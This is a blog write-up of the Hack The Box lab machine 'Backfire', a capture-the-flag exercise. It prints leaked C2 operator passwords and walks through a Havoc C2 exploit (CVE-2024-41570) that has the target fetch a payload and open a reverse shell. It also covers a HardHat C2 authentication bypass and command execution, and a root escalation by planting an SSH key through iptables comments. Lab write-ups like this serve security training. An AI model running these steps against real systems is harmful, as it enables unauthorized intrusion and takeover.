+++
title = "HTB - Backfire"
date = "2025-05-08"
author = "dax"
cover = ""
tags = ["havoc", "hardhat", "iptables"]
keywords = ["hacking", "htb", "bigbang", "hack the box"]
description = "Write-up of Hack The Box medium machine Backfire"
showFullContent = false
readingTime = true
hideComments = false
color = "green"
+++

# HTB - Backfire

## Enumeration:

```bash
# Nmap 7.95 scan initiated Mon Apr  7 20:51:31 2025 as: /usr/lib/nmap/nmap -v -p - -Pn -T4 -A -oN nmaptcp backfire.htb
Nmap scan report for backfire.htb (10.10.11.49)
Host is up (0.022s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey:
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
443/tcp  open     ssl/http nginx 1.22.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.22.1
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=tech llc/stateOrProvinceName=Arizona/countryName=US
| Subject Alternative Name: IP Address:127.0.0.1
| Issuer: commonName=127.0.0.1/organizationName=tech llc/stateOrProvinceName=Arizona/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-01T11:01:32
| Not valid after:  2027-12-01T11:01:32
| MD5:   1800:61c0:a3c0:1af2:319a:d394:f211:d710
|_SHA-1: 4994:334e:ebe9:fb65:bcaf:e177:0ff8:36f7:da35:d37c
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: 404 Not Found
5000/tcp filtered upnp
7096/tcp filtered unknown
8000/tcp open     http     nginx 1.22.1
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|_  Supported Methods: GET HEAD POST
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 12:31  disable_tls.patch
| 875   17-Dec-2024 12:34  havoc.yaotl
|_
|_http-server-header: nginx/1.22.1
|_http-title: Index of /
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Uptime guess: 25.293 days (since Thu Mar 13 13:50:37 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   21.90 ms 10.10.14.1
2   21.99 ms backfire.htb (10.10.11.49)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  7 20:52:11 2025 -- 1 IP address (1 host up) scanned in 40.17 seconds
```

## User exploit

By looking at the nmap scan, one thing that stands out is the directory listing on port 8000. The `havoc.yaotl` file is particularly interesting. It contains a configuration file for `Havoc`. As per their Github, _Havoc is a modern and malleable post-exploitation command and control framework_. The file contains not only the server's configurations such as ports and domain names, but also usernames and passwords.

```
Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1"
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}
```

Googling known vulnerabilities for the C2, we quickly find `CVE-2024-41570`, and a few PoC Github repos. For me, the one that worked best was `thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE` (see resources for the link). The vulnerability is explained pretty clearly in the README:

```
This is a Chained RCE (CVE-2024-41570) in the Havoc C2 framework.

Command injection: Havoc is vulnerable to command injection enabling an authenticated user to execute commands on the Teamserver. Affects versions 0.3 up to the latest release 0.6. Havoc's default profile contains hardcoded passwords, so a C2 operator careless enough to use the default profile on a public network can immediately be exploited.

SSRF: This vulnerability is exploited by spoofing a demon agent registration and checkins to open a TCP socket on the teamserver and read/write data from it. This allows attackers to leak origin IPs of teamservers and much more.

Chain: Abusing SSRF to deliver an authenticated command injection payload.
```

The description of the command injection vulnerability talks about default credentials, but since we found credentials in the `havoc.yaotl` file, it doesn't really matter. To exploit the vulnerability using the script, we first need to change a few values in `exploit.py`: the username and passwords (which can be found in the `havoc.yaotl` file), the target IP, the target port (it is the port 443 that we saw in the nmap scan), and finally the IP in the curl command that the server will execute to contact our HTTP server (so our IP and port of our python http server). We also need to adjust the `payload.sh` file so that it contains the address and port of our netcat listener. Once that is taken care of, we can launch the script.

```bash
# Start netcat
$ nc -nlvp 5555

# Start a python http server in the folder where payload.sh is
$ python -m http.server

# Launch the script. The IP and the target ports are the ones of the Teamserver in the havoc.yaotl configuration
# The IP is 127.0.0.1 since the request will be executed in the context of the victim
$ python exploit.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056
```

This should allow us to get a shell as the `ilya` user, and the user flag.

## Root exploit

Now that we have access to the machine, we can use SSH to access ports 5000 and 7096 which were filtered in the nmap scan. Let's add our public key to the users `authorized_keys` and use local port forwarding.

```bash
$ ssh -i ~/.ssh/id_rsa -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096 ilya@backfire.htb
```

Now, by visiting 127.0.0.1:7096, we find yet another C2 framework, `HardHat C2`. And once again, a quick Google search allows us to find a Medium article titled `HardHatC2 0-Days (RCE & AuthN Bypass)`. It explains three vulnerabilities of the C2 software, two of which we can chain to get a shell on the machine.

![](/img/htb/backfire/hhc2.png)

First, there is an authentication bypass that is caused by a static JWT signing key. Knowing that, we can craft a valid administrator token for the app. The article gives us Python code to do just that, and we are able to log into the C2.

Second, once authenticated as a team lead, we can use the implants interface to execute arbitrary commands on the host itself. We can use it to first find out that the C2 is running as the `sergej` user, and then to upload our public key to his authorized keys to be able to connect using SSH.

![](/img/htb/backfire/hhc2_whoami.png)

![](/img/htb/backfire/hhc2_ssh.png)

Now that we can access the machine using SSH as `sergej`, we can run `sudo -l` to see that we can execute a few `iptables` commands as `root`.

```bash
$ sudo -l
Matching Defaults entries for sergej on backfire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
```

Once again, we turn to our trusty Google to find an article named `A Journey From sudo iptables To Local Privilege Escalation`. It explains two attack vectors that can be exploited when a user can run `iptables` or `iptables-save` as `root`. In our case, the first vector is the one we want:

> A low-privileged user on a Linux machine can obtain the root privileges if they can execute iptables and iptables-save with sudo as they can inject a fake /etc/passwd entry in the comment of an iptables rule and then abusing iptables-save to overwrite the legitimate /etc/passwd file.

Now unfortunately it is a little bit more complicated than that in our case, since the `/etc/passwd` and `/etc/shadow` files have been set as immutable. However, since we can overwrite any file, we can once again write to the `authorized_keys` file, but this time for the `root` user. There is only one small problem: the maximum length of an `iptables` comment is too short to fit a standard RSA key. A simple solution is to generate a key in a format that is smaller, such as `ed25519`.

```bash
# Craft a small SSH key
$ ssh-keygen -t ed25519

# Inject it in iptables comment
$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA6K1LRhUnGJr8fyqnRZiB6WDY6pDcOhLJYsAPWaTXlV\n'

# Save the table to authorized keys
$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

We can now log in using SSH and the `root` user and get the root flag.

## Resources:

| Hyperlink                                                                                         | Info                                                       |
| ------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE                                    | Havoc-C2-RCE (CVE-2024-41570)                              |
| https://github.com/HavocFramework/Havoc                                                           | Havoc                                                      |
| https://github.com/DragoQCC/CrucibleC2                                                            | HardHat C2                                                 |
| https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7                                | HardHatC2 0-Days (RCE & AuthN Bypass)                      |
| https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/ | A Journey From sudo iptables To Local Privilege Escalation |
